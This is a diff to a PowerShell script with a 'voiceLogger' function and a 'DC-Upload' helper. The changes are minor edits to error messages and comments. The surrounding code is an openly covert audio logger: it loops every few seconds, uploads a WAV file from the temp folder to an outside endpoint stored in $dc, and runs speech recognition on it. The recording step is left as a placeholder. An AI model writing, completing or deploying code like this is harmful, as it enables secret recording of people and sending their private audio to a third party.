@@ -26,6 +26,8 @@ Content-Type: application/octet-stream
         $bodyBytes = ([Text.Encoding]::UTF8.GetBytes($fileHeader) + $fileBytes + [Text.Encoding]::UTF8.GetBytes($fileFooter))
         
         Invoke-RestMethod -ContentType $contentType -Uri $dc -Method Post -Body $bodyBytes
+    } else {
+        Write-Host "File path is either empty or the file does not exist: $filePath"
     }
 }
 
@@ -38,13 +40,10 @@ function voiceLogger {
 
     $waveFilePath = "$env:tmp\VoiceLog.wav"
 
-    # Record audio (replace with actual recording logic)
-    # Example: Using Windows Voice Recorder or any other method to save WAV file to $waveFilePath
+    # Mock recording placeholder
+    # Ensure that $waveFilePath is populated with audio recording logic.
 
     while ($true) {
-        # This is a placeholder for recording logic.
-        # You need to ensure the $waveFilePath is properly created and populated.
-        
         if (Test-Path $waveFilePath) {
             # Send the WAV file to the server
             DC-Upload $waveFilePath
@@ -52,7 +51,7 @@ function voiceLogger {
             # Optional: Remove the WAV file after upload
             # Remove-Item $waveFilePath
 
-            # Handle voice commands
+            # Process voice commands
             $result = $recognizer.Recognize()
             if ($result) {
                 Write-Output $result.Text
@@ -62,7 +61,7 @@ function voiceLogger {
                 }
             }
         } else {
-            Write-Host "Error: The audio file was not found."
+            Write-Host "Error: The audio file was not found at $waveFilePath"
         }
 
         Start-Sleep -Seconds 10  # Sleep to avoid high CPU usage, adjust as needed
